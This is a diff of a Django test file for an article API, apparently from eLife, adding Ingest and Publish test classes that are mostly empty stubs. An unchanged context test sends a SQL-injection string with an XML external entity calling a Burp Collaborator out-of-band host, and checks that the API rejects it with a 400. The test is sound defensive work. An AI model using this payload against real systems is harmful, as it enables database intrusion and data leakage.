@@ -925,3 +925,77 @@ class RequestArgs(base.BaseCase):
         malicious_str = """1'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % gxurp SYSTEM "http://85br0ak8odwikzkm7mh80kqnfel8e024qvdm1b.burpcollab'||'orator.net/">%gxurp;]>'),'/l') from dual)||'"""
         resp = self.c.get(reverse('v2:article-list'), {'page': malicious_str})
         self.assertEqual(resp.status_code, 400) # bad request
+
+
+# we're testing the interface here, not that business rules are enforced.
+# see publisher.tests.test_ajson_ingest for that
+
+class Ingest(base.BaseCase):
+    def setUp(self):
+        # an unauthenticated client
+        self.c = Client()
+        # an authenticated client
+        self.ac = Client(**{
+            mware.CGROUPS: 'view-unpublished-content',
+        })
+        self.ajson, self.msid, self.version = self.slurp_fixture("elife-16695-v1.xml.json")
+        self.url = reverse('v2:article-version', kwargs={'msid': self.msid, 'version': self.version})
+
+    def test_ingest(self):
+        "bog standard ingest"
+        import json
+        resp = self.ac.put(self.url, json.dumps(self.ajson, indent=4), content_type='application/vnd.elife.article-poa+json; version=2')
+        self.assertEqual(resp.status_code, 200)
+
+    def test_ingest_forced(self):
+        pass
+
+    def test_ingest_dryrun(self):
+        pass
+
+    def test_ingest_forced_dryrun(self):
+        pass
+
+    def test_ingest_bad_ajson(self):
+        "ajson is malformed"
+        pass
+
+    def test_ingest_bad_state(self):
+        "breaks business rules"
+        pass
+
+    def test_ingest_bad_http_request(self):
+        "breaks http api"
+        pass
+
+    def test_ingest_bad_something(self):
+        "unknown failure"
+        pass
+
+class Publish(base.BaseCase):
+    def setUp(self):
+        pass
+
+    def test_publish(self):
+        pass
+
+    def test_publish_forced(self):
+        pass
+
+    def test_publish_dryrun(self):
+        pass
+
+    def test_publish_forced_dryrun(self):
+        pass
+
+    def test_publish_bad_state(self):
+        "breaks business rules"
+        pass
+
+    def test_publish_bad_http_request(self):
+        "breaks http api"
+        pass
+
+    def test_publish_bad_something(self):
+        "unknown failure"
+        pass
